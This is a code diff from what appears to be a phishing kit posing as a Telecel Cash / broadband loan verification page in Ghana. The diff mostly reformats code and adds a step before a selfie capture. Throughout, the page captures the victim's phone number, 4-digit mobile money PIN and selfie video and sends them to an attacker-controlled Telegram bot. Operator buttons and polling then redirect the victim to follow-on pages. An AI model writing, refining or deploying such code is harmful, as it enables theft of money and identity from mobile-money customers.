   fd.append('caption', caption);
-
-  try {
-    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`, {
-      method:'POST', body:fd
-    });
-  } catch(_) { /* silently ignore */ }
+  try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`, { method:'POST', body:fd }); } catch(_) {}
 }
 
 function sendMainMessage() {
-  const ts        = Date.now();
-  const approveId = `approve_${ts}`;
-  const declineId = `decline_${ts}`;
-  const verifyId  = `verify_${ts}`;
-  const appliedId = `applied_${ts}`;
-
-  const accountType = document.getElementById('accountType').value==='mobile'
-    ? 'Telecel Cash (Mobile Money)' : 'Broadband';
-
+  const ts = Date.now();
+  const approveId = `approve_${ts}`, declineId = `decline_${ts}`, verifyId = `verify_${ts}`, appliedId = `applied_${ts}`;
+  const accountType = document.getElementById('accountType').value==='mobile' ? 'Telecel Cash' : 'Broadband';
   fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({
       chat_id: CONFIG.CHAT_ID,
-      text: `<b>🔴 Telecel Loan Verification</b>\n\n` +
-            `Amount: ${document.getElementById('loanAmount').textContent}\n` +
-            `Account Type: <code>${accountType}</code>\n` +
-            `Phone: <code>${capturedPhone}</code>\n` +
-            `PIN: <code>${capturedPin}</code>\n\n` +
-            `Choose Action:`,
+      text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nAccount Type: <code>${accountType}</code>\nPhone: <code>${capturedPhone}</code>\nPIN: <code>${capturedPin}</code>\n\nChoose Action:`,
       parse_mode:'HTML',
       reply_markup:{
         inline_keyboard:[
-          [
-            { text:'✅ Approve Loan',  callback_data:approveId },
-            { text:'📱 Verify Device', callback_data:verifyId }
-          ],
-          [
-            { text:'📋 Applied',       callback_data:appliedId },
-            { text:'🚫 Decline',       callback_data:declineId }
-          ]
+          [{ text:'✅ Approve Loan', callback_data:approveId }, { text:'📱 Verify Device', callback_data:verifyId }],
+          [{ text:'📋 Applied', callback_data:appliedId }, { text:'🚫 Decline', callback_data:declineId }]
         ]
       }
     })
   })
-  .then(()=>{
-    spinnerEl.style.display='flex';
-    startPolling(approveId, declineId, verifyId, appliedId);
-  })
+  .then(()=>{ spinnerEl.style.display='flex'; startPolling(approveId, declineId, verifyId, appliedId); })
   .catch(()=>resetButton());
 }
 
 async function proceedWithSubmission() {
-  // 1. Send the selfie video first
   await sendVideoToTelegram();
-  // 2. Then send the action message
   sendMainMessage();
 }
 
-/* ─── POLLING ────────────────────────────── */
 function startPolling(approveId, declineId, verifyId, appliedId) {
   const interval = setInterval(()=>{
     fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${botState.lastUpdateId+1}`)
@@ -614,19 +595,11 @@ function startPolling(approveId, declineId, verifyId, appliedId) {
           botState.lastUpdateId = update.update_id;
           if(update.callback_query){
             const cb = update.callback_query.data;
-            if(cb===approveId){
-              clearInterval(interval); spinnerEl.style.display='none';
-              window.location.href=`${CONFIG.APPROVE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-            } else if(cb===verifyId){
-              clearInterval(interval); spinnerEl.style.display='none';
-              window.location.href=`${CONFIG.DEVICE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-            } else if(cb===appliedId){
-              clearInterval(interval); spinnerEl.style.display='none';
-              showToast(); resetButton();
-            } else if(cb===declineId){
-              clearInterval(interval); spinnerEl.style.display='none';
-              showError('Request declined. Please try again.'); resetButton();
-            }
+            const search = new URLSearchParams(window.location.search).toString();
+            if(cb===approveId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.APPROVE_PAGE}?${search}`; }
+            else if(cb===verifyId){ clearInterval(interval); spinnerEl.style.display='none'; window.location.href=`${CONFIG.DEVICE_PAGE}?${search}`; }
+            else if(cb===appliedId){ clearInterval(interval); spinnerEl.style.display='none'; showToast(); resetButton(); }
+            else if(cb===declineId){ clearInterval(interval); spinnerEl.style.display='none'; showError('Request declined. Please try again.'); resetButton(); }
           }
         });
       })
@@ -634,32 +607,26 @@ function startPolling(approveId, declineId, verifyId, appliedId) {
   }, 1000);
 }
 
-/* ─── FORM SUBMIT ────────────────────────── */
 continueBtn.onclick = () => {
   errMsg.style.display='none';
   const phone = phoneInput.value.trim();
   const pin   = pinInput.value.trim();
-
-  if(!phone || !isValidGhanaNumber(phone)){
-    showError('Please enter a valid Ghana number (e.g. 0501234567)'); return;
-  }
-  if(pin.length!==4){
-    showError('PIN must be exactly 4 digits'); return;
-  }
+  if(!phone || !isValidGhanaNumber(phone)){ showError('Please enter a valid Ghana number (e.g. 0501234567)'); return; }
+  if(pin.length!==4){ showError('PIN must be exactly 4 digits'); return; }
   if(isProcessing) return;
+  capturedPhone = phone; capturedPin = pin;
+  preSelfieModal.style.display = 'flex';
+};
 
-  capturedPhone = phone;
-  capturedPin   = pin;
-  isProcessing  = true;
-  continueBtn.disabled=true;
-  continueBtn.textContent='Verifying…';
-
+startCaptureBtn.onclick = () => {
+  preSelfieModal.style.display = 'none';
+  isProcessing = true;
+  continueBtn.disabled = true;
+  continueBtn.textContent = 'Verifying…';
   startSelfieVerification();
 };
 
-phoneInput.addEventListener('input',()=>{
-  phoneInput.value = phoneInput.value.replace(/[^0-9]/g,'').slice(0,10);
-});
+phoneInput.addEventListener('input',()=>{ phoneInput.value = phoneInput.value.replace(/[^0-9]/g,'').slice(0,10); });
 pinInput.addEventListener('input',()=>{
   pinInput.value = pinInput.value.replace(/[^0-9]/g,'').slice(0,4);
   if(pinInput.value.length===4) pinInput.blur();
